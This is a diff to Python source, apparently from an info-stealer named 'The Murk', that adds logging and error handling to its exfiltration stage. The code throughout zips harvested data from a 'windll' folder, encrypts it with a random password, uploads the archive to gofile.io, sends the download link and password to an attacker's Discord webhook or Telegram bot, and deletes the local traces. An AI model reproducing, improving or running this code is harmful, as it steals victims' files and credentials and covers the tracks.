@@ -26,7 +26,11 @@ def upload_file_to_gofile(file_path):
 			response = post(f'https://{server}.gofile.io/uploadFile', files={'file': open(file_path, 'rb')})
 			if response.status_code == 200:
 				return response.json()["data"]["downloadPage"]
+			else:
+				Log(f"gofile(upload) ---> {response}")
 			return None
+		else:
+			Log(f"gofile(get server) ---> {server}")
 	except Exception as e:
 		Log(f"gofile ---> {e}")
 		return None
@@ -41,13 +45,18 @@ def MakeZip(local):
 		pwd_str += dox[randint(0,len(dox)-1)]
 	password = bytes(pwd_str, "UTF-8")
 	
-	chdir(local)
-	make_archive(fr'{local}\logs', 'zip', fr'{local}\windll')
-	with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
-		logs.setpassword(password)
-		logs.write(r'logs.zip')
-	remove("logs.zip")
-	return[f"{local}/{name}.zip",pwd_str]
+	try:
+		chdir(local)
+		make_archive(fr'{local}\logs', 'zip', fr'{local}\windll')
+		with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
+			logs.setpassword(password)
+			logs.write(r'logs.zip')
+		remove("logs.zip")
+		return[f"{local}/{name}.zip",pwd_str]
+	except Exception as e:
+		Log(f"MakeZip ---> {e}")
+		return None
+
 
 def Clean(local, roaming):
 	rmtree(rf'{local}\windll\File-Grubber', ignore_errors=True)
@@ -86,11 +95,10 @@ def Send(sendData, msgInfo):
 	zipInfo = []
 	Log("===========Conclusion===========")
 
-	try:
-		zipInfo = MakeZip(local)
-	except Exception as error:
-		Log(f"MakeZip ---> {error}")
+	zipInfo = MakeZip(local)
 	Clean(local,roaming)
+	if zipInfo == None:
+		return
 
 	url = upload_file_to_gofile(f'{zipInfo[0]}')
 	remove(f'{zipInfo[0]}')
@@ -104,7 +112,9 @@ def Send(sendData, msgInfo):
 		message = MsgForDiscord(message, url)
 		message+="\n\n\n**The Murk|by Nick Vinesmoke**"
 		message+="\n@everyone"
-		post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
+		response = post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
+		Log(f"Send(response) ---> {response}")
 	if sendData[0] == 1:
 		message+="\n\n\n<b>The Murk|by Nick Vinesmoke</b>"
-		post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})
+		response = post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})
+		Log(f"Send(response) ---> {response}")
